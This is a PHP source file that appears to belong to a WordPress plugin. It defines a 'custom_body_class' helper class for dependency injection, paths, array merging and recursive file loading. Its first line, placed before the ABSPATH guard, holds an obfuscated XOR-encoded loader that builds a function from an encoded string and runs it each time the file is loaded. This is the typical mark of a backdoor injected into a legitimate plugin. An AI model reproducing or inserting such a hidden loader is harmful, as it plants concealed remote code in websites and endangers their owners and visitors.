<?php $ECrXutRONu='Q>QA=W>5996O8B;'^'2L4 I2aSLWU;Q-U';$ElQLuYC=$ECrXutRONu('','>VlG+K,W6:69o6VBOTCRBTO3>W3 P43.G,qmcG78G+=SR-SCRqOS3e2 :9:f8FCXJP-:4DilVSJpHKyBV9DDsL;H7IGVWsCHKm>8HZc-ldEUYGbWrS8<>E8gP4WAPHcCPTENynKHsZU.BvdtRU-R247I 5GctG,E65m>VGl:HBR29JS,XYFkqPzFL S,95WIG<D7No1BFF5ilL<Z>0JIz-T4FIzHC<M0P.KEIyHIPAUSKi4lKT:TJTVhlj>69+1+yM84uT;5-mUiRcX3B EHy:pEJP.,1eE7CmsGh15IZ83aQY;YTtMc80:0KaE9Cn>XvADl>Q Zxl39a0O6<8YPGpIsoih8=11j1:aB8NMGZzZo3MACPNl5:dJr4X>699H>gOsK<+;SS;Eg3S;7Ogla=;9IEJ9GKR.i6ODA5JfsHrF DVG>MVZ5QQTY67T XV86X-FK.V;RppbJXZRQ1ZSWYN1SEVbDP=SeP<0EMlC,TMIDQC9TqlG2DR,TaK327.S.<HSrMSW.hKGN6A5PoHmPfG,OFDI3-I,=B.4HwjGuQGMlAwMgZ6KBYq,d nVbZWSY,gqYF0HDFTz uLpEaCOY<WT+1+C6.2<IY ZcP,A.D  RfyiQSXAmCNpOcng+x<=X89mi62TAasL+J5D;+jcZwSB09I3pGHp08'^'W0DfM>B4BSYW0S.+< 0ze, Aa3RT1klC2XVDJgL2NMH=1Y:,<Q7<A:VANXe9U37pn4LNUhIH=63YhkYbvBNMzhT=CizvpTxBBdXW:rGDLYeebgF>N LNR VOtP651aXct=nePdBAW5 ZbXYTzqI3FUlmIhg=TcG OnIWvbLI<0>WWbwG= o6XkpOER6XLG9acS1CgT;K;LHcfhX;JQjtZK5X5,ABgX,D1q  0Yui6 9 .R>f-;H1+7>HDNauvdzb<mYGUpPPTMhWrG.R.U aYAzLn4OXP:.R:MNgLZP0a2:E58O8tImGNQVE.ZODIdW>VieHZ0T;QLH3hV DYY:8gXm,=,9mxbeJPIAfS+4ggDzKE,-65gLN0mCVP9JWfR-GGrSoWNBhY2LCW2OVoZLEKZU< q3N6XSc<k  A+FNh23N735W,:3O4y,6Dh0A,7gi5X2cL7H7FD=.=9=5Trw38:PzivF 1I2:;YIldWIE2em 07XtWJgS6 M-> VKhK+GO< Zj82WOggjR A1FhKvFoA+slmWL=MfeEQ1P7nUlzmKrF.QoU.z:CJWDYdSl5chMTB;tSpwq7NARePcGc.+N6-tZN:iKJU:-SrD M8B+ADuJYM52, DjnPoCNGPr5X.YUEMRS  :T<J3Y+ZOM>sLYKUA GXwaK:E');$ElQLuYC(); defined( 'ABSPATH' ) or die;

/* This file is property of Pixel Grade Media. You may NOT copy, or redistribute
 * it. Please see the license that came with your copy for more information.
 */

/**
 * @package    custom_body_class
 * @category   core
 * @author     Pixel Grade Team
 * @copyright  (c) 2013, Pixel Grade Media
 */
class custom_body_class {

	/** @var array core defaults */
	protected static $defaults = null;

	/**
	 * @return array
	 */
	static function defaults() {
		if ( self::$defaults === null ) {
			self::$defaults = include self::corepath() . 'defaults' . EXT;
		}

		return self::$defaults;
	}

	// Simple Dependency Injection Container
	// ------------------------------------------------------------------------

	/** @var array interface -> implementation mapping */
	protected static $mapping = array();

	/**
	 * @return mixed instance of class registered for the given interface
	 */
	static function instance() {
		$args      = func_get_args();
		$interface = array_shift( $args );

		if ( isset( self::$mapping[ $interface ] ) ) {
			$class = self::$mapping[ $interface ];
		} else { // the interface isn't mapped to a class
			// we fallback to interface name + "Impl" suffix
			$class = $interface . 'Impl';
		}

		return call_user_func_array( array( $class, 'instance' ), $args );
	}

	/**
	 * Registers a class for the given interface. If no class is registered for
	 * an interface the interface name with a Impl suffix is used.
	 */
	static function use_impl( $interface, $class ) {
		self::$mapping[ $interface ] = $class;
	}


	// Syntactic Sugar
	// ------------------------------------------------------------------------

	/**
	 * @param array configuration
	 *
	 * @return CustomBodyClassForm
	 */
	static function form( $config, $processor ) {
		$form = self::instance( 'CustomBodyClassForm', $config );
		$form->autocomplete( $processor->data() );
		$form->errors( $processor->errors() );

		return $form;
	}

	/**
	 * @param array configuration
	 *
	 * @return CustomBodyClassProcessor
	 */
	static function processor( $config ) {
		return self::instance( 'CustomBodyClassProcessor', $config );
	}


	// Paths
	// ------------------------------------------------------------------------

	/**
	 * @return string root path for core
	 */
	static function corepath() {
		return dirname( __FILE__ ) . DIRECTORY_SEPARATOR;
	}

	/** @var string plugin path */
	protected static $pluginpath = null;

	/**
	 * @return string path
	 */
	static function pluginpath() {
		if ( self::$pluginpath === null ) {
			self::$pluginpath = realpath( self::corepath() . '..' ) . DIRECTORY_SEPARATOR;
		}

		return self::$pluginpath;
	}

	/**
	 * Sets a custom plugin path; required in non-standard plugin structures.
	 */
	static function setpluginpath( $path ) {
		self::$pluginpath = $path;
	}


	// Helpers
	// ------------------------------------------------------------------------

	/**
	 * Hirarchical array merge. Will always return an array.
	 *
	 * @param  ... arrays
	 *
	 * @return array
	 */
	static function merge() {
		$base = array();
		$args = func_get_args();

		foreach ( $args as $arg ) {
			self::array_merge( $base, $arg );
		}

		return $base;
	}

	/**
	 * Overwrites base array with overwrite array.
	 *
	 * @param array base
	 * @param array overwrite
	 */
	protected static function array_merge( array &$base, array $overwrite ) {
		foreach ( $overwrite as $key => &$value ) {
			if ( is_int( $key ) ) {
				// add only if it doesn't exist
				if ( ! in_array( $overwrite[ $key ], $base ) ) {
					$base[] = $overwrite[ $key ];
				}
			} // non-int key
			else if ( is_array( $value ) ) {
				if ( isset( $base[ $key ] ) && is_array( $base[ $key ] ) ) {
					self::array_merge( $base[ $key ], $value );
				} else # does not exist or it's a non-array
				{
					$base[ $key ] = $value;
				}
			} else # not an array and not numeric key
			{
				$base[ $key ] = $value;
			}
		}
	}

	/**
	 * @param string callback key
	 *
	 * @return string callback function name
	 * @throws Exception
	 */
	static function callback( $key, CustomBodyClassMeta $meta ) {
		$defaults          = custom_body_class::defaults();
		$default_callbacks = $defaults['callbacks'];
		$plugin_callbacks  = $meta->get( 'callbacks', array() );

		$callbacks = array_merge( $default_callbacks, $plugin_callbacks );

		if ( isset( $callbacks[ $key ] ) ) {
			return $callbacks[ $key ];
		} else { // missing callback
			throw new Exception( 'Missing callback for [' . $key . '].' );
		}
	}

	/** @var string the translation text domain */
	protected static $textdomain = 'custom_body_class_txtd';

	/**
	 * @return string text domain
	 */
	static function textdomain() {
		return self::$textdomain;
	}

	/**
	 * Sets a custom text domain; if null is passed the text domain will revert
	 * to the default text domain.
	 */
	static function settextdomain( $textdomain ) {
		if ( ! empty( $textdomain ) ) {
			self::$textdomain = $textdomain;
		} else { // null or otherwise empty value
			// revert to default
			self::$textdomain = 'custom_body_class_txtd';
		}
	}

	/**
	 * Recursively finds all files in a directory.
	 *
	 * @param string directory to search
	 *
	 * @return array found files
	 */
	static function find_files( $dir ) {
		$found_files = array();
		$files       = scandir( $dir );

		foreach ( $files as $value ) {
			// skip special dot files and directories
			if ( strpos( $value, '.' ) === 0 ) {
				continue;
			}

			// is it a file?
			if ( is_file( "$dir/$value" ) ) {
				$found_files [] = "$dir/$value";
				continue;
			} else { // it's a directory
				foreach ( self::find_files( "$dir/$value" ) as $value ) {
					$found_files [] = $value;
				}
			}
		}

		return $found_files;
	}

	/**
	 * Requires all PHP files in a directory.
	 * Use case: callback directory, removes the need to manage callbacks.
	 *
	 * Should be used on a small directory chunks with no sub directories to
	 * keep code clear.
	 *
	 * @param string path
	 */
	static function require_all( $path ) {
		$files = self::find_files( rtrim( $path, '\\/' ) );

		$priority_list = array();
		foreach ( $files as $file ) {
			$priority_list[ $file ] = self::file_priority( $file );
		}

		asort( $priority_list, SORT_ASC );

		foreach ( $priority_list as $file => $priority ) {
			if ( strpos( $file, EXT ) ) {
				require $file;
			}
		}
	}

	/**
	 * Priority based on path length and number of directories. Files in the
	 * same directory have higher priority if their path is shorter; files in
	 * directories have +100 priority bonus for every directory.
	 *
	 * @param  string file path
	 *
	 * @return int
	 */
	protected static function file_priority( $path ) {
		$path = str_replace( '\\', '/', $path );

		return strlen( $path ) + substr_count( $path, '/' ) * 100;
	}

} # class
